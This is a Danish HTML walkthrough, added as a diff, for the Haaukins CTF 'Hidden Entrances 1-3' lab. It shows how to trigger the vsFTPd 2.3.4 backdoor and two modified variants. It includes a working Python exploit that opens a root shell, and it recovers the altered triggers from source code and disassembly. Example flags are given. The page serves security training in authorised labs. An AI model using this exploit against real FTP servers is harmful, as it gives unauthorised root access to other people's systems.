@@ -1,0 +1,110 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Hidden Entrances 1-3, tutorial (vsFTPd-backdoor i tre sværhedsgrader)</title>
+<meta name="description" content="Guide til Haaukins Hidden Entrances 1-3: samme vsFTPd 2.3.4-backdoor-tema tre gange, først banner-genkendelse, så kildekode-review, så statisk binær-reversing.">
+<link rel="canonical" href="https://lolcatatonia.github.io/haaukins-walkthroughs/hidden-entrances.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Haaukins: Hidden Entrances 1-3, tutorial (vsFTPd-backdoor i tre sværhedsgrader)">
+<meta property="og:description" content="Guide til Haaukins Hidden Entrances 1-3: samme vsFTPd 2.3.4-backdoor-tema tre gange, først banner-genkendelse, så kildekode-review, så statisk binær-reversing.">
+<meta property="og:url" content="https://lolcatatonia.github.io/haaukins-walkthroughs/hidden-entrances.html">
+<meta property="og:image" content="https://lolcatatonia.github.io/haaukins-walkthroughs/assets/og-default.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lolcatatonia.github.io/haaukins-walkthroughs/assets/og-default.png">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Hidden Entrances (1-3)", "description": "Guide til Haaukins Hidden Entrances 1-3: samme vsFTPd 2.3.4-backdoor-tema tre gange, først banner-genkendelse, så kildekode-review, så statisk binær-reversing.", "url": "https://lolcatatonia.github.io/haaukins-walkthroughs/hidden-entrances.html", "inLanguage": "da", "about": {"@type": "Thing", "name": "Haaukins CTF"}}</script>
+<link rel="stylesheet" href="assets/style.css">
+<script src="assets/gloss.js" defer></script>
+<script src="assets/hire-widget.js" defer></script>
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Hidden Entrances (1-3)</h1>
+<p class="subtitle">Samme backdoor-idé, tre niveauer af hvor godt den er gemt.</p>
+<div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinnene viser metoden, det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+<div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik. Læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
+<h2>#1: banneret afslører det hele</h2>
+<p>Et <code>USER</code>/<code>PASS</code>-forsøg mod <code>backdoor1.hkn</code> (port 21)
+viser banneret <code>220 (vsFTPd 2.3.4)</code>. Den version har en berømt, offentligt kendt
+bagdør (CVE-2011-2523), så opgavens egen tekst, "nogen har efterladt en bagdør, find den og bryd
+ind", er helt bogstavelig her, ikke et billede.</p>
+<p>Triggeren for den kendte vsFTPd 2.3.4-bagdør er et brugernavn der indeholder <code>:)</code>
+(bytes <code>0x3a 0x29</code>), som åbner en root-shell på port 6200:</p>
+             <pre><code>import socket, time
+s = socket.socket(); s.connect((IP, 21)); s.recv(256)
+s.sendall(b'USER evil:)\r\n'); time.sleep(.4); s.recv(256)
+s.sendall(b'PASS x\r\n'); time.sleep(1)
+b = socket.socket(); b.connect((IP, 6200))
+b.sendall(b'id; cat /root/flag.txt\n'); time.sleep(2)
+print(b.recv(8192).decode())</code></pre>
+<h2>#2: triggeren er flyttet, kildekoden ligger i det åbne</h2>
+<p><code>backdoor2.hkn</code> banner viser <code>vsFTPd 2.3.4 (Modified Source)</code>,
+altså samme udgangspunkt, men ændret. Opgavens hint, "de efterlod kildekoden i den anonyme
+brugers mappe", peger direkte på hvor man skal lede, ANONYM FTP-login i stedet for gæt:</p>
+             <pre><code>curl -sS 'ftp://anonymous:anonymous@backdoor2.hkn/pub/vsftpd.tar.gz' -o src.tgz
+tar xzf src.tgz
+grep -nE '0x3[0-9a-f]|0x2[0-9a-f]' vsftpd-*/str.c
+# -> buf[i]==0x3d && buf[i+1]==0x28</code></pre>
+             <p><code>0x3d 0x28</code> er tegnene <strong><code>=(</code></strong>, den nye trigger.
+<code>sysdeputil.c</code> viser at porten stadig er 6200 (<code>htons(6200)</code> er uændret),
+kun selve trigger-strengen i <code>str.c</code> blev flyttet:</p>
+             <pre><code># USER evil=(  /  PASS x  -> root-shell på 6200</code></pre>
+<h2>#3: ingen kildekode tilbage, kun en stripped binær</h2>
+<p><code>backdoor3.hkn</code> banner: <code>vsFTPd 2.3.4 (Very Modified Source)</code>.
+Hintet skifter karakter: "denne gang skal du reverse-engineere lidt!!" Anonym FTP giver denne gang
+kun en stripped ELF64-binær, intet <code>.tar.gz</code> med kildekode:</p>
+             <pre><code>curl -sS 'ftp://anonymous:anonymous@backdoor3.hkn/pub/vsftpd' -o vsftpd
+<span class="gloss" tabindex="0" data-tip="Disassemblerer en binær fil til assembly, en del af binutils.">objdump</span> -d vsftpd > d.txt</code></pre>
+             <p>To ting skal findes i disassemblyen: porten og triggeren. Backdoor-funktionen
+importerer <code>socket/bind/listen/accept/dup2/execl</code>, så følg kaldet til
+<code>bind@plt</code> baglæns:</p>
+             <pre><code>mov $0xf27,%edx
+mov %dx,sin_port   # 0x0f27 = htons(9999) -> port 9999</code></pre>
+             <p>Backdoor-funktionen (adresse <code>0x413320</code>) kaldes fra <code>0x40ac14</code>.
+Lige før selve kaldet ligger en kæde af <code>cmpb</code>-instruktioner der sammenligner hvert
+byte i USER-strengen mod en konstant:</p>
+             <pre><code>cmpb $0x64  ; 'd'
+cmpb $0x75  ; 'u'
+cmpb $0x66  ; 'f'
+cmpb $0x79  ; 'y'
+cmpb $0x72  ; 'r'
+cmpb $0x65  ; 'e'
+cmpb $0x74  ; 't'
+# -> trigger = "dufyret"</code></pre>
+             <p>Samlet: <code>USER dufyret</code> / <code>PASS x</code> åbner en root-shell på
+port 9999.</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag #1: <span class="flag">HKN{HLJ-yA-Gt9Qb}</span><br>
+Flag #2: <span class="flag">HKN{sY-yx-FzFYR1}</span><br>
+Flag #3: <span class="flag">HKN{I2-Mp5-cEDeu}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>Banneret <code>vsFTPd 2.3.4</code> alene er et rødt flag, den version har en navngiven, offentligt kendt bagdør.</li><li>Når kildekoden er tilgængelig (her: anonym FTP), er <code>grep</code> efter byte-sammenligninger hurtigere end gætteri.</li><li>Uden kildekode er <code>objdump -d</code> stadig nok: følg PLT-kald til <code>bind</code>/<code>execl</code> for at finde funktionen, læs porten af en <code>htons</code>-immediate, og triggeren af en kæde af <code>cmpb</code>-instruktioner.</li><li>Behandl downloadede artefakter som untrusted: egen tomme mappe, og en ukendt binær køres aldrig, kun statisk analyse.</li></ul>
+<h2>Hvor ses dette igen?</h2>
+<p>Alle tre delopgaver er samme lektion i tre sværhedsgrader: find en skjult
+betingelse der udløser noget den almindelige bruger ikke skal kunne. Først ved et kendt
+navn/version (CVE-opslag), så ved at læse kildekoden direkte, så ved at læse maskinkoden når
+kildekoden mangler. Det samme mønster (kendt signatur, så kildekode-review, så binær-reversing)
+går igen hver gang man undersøger en ukendt tjeneste, uanset om det er en CTF-opgave eller en
+rigtig pentest.</p>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
+er en dansk undervisningsplatform til sikkerhedstræning (AAU, De Danske Cybermesterskaber). Alle opgaver
+løses på platformens egne, formålsbyggede lab-miljøer, aldrig på andres systemer. Guiden forudsætter du selv
+har autoriseret adgang (fx som studerende eller deltager) og er løsningsstøtte til at lære metoden, ikke en
+genvej uden om selv at forstå den.
+</footer>
+</div>
+<aside id="hire-widget">
+<button class="hw-close" type="button" aria-label="Luk">×</button>
+<p>👋 Håber det her hjalp!</p>
+<p>For langhåret til dig? Overvej at ansætte ham der skrev det.</p>
+<a class="hw-link" href="https://www.linkedin.com/in/alexandermangaard/en" target="_blank" rel="noopener">LinkedIn →</a>
+</aside>
+</body>
+</html>
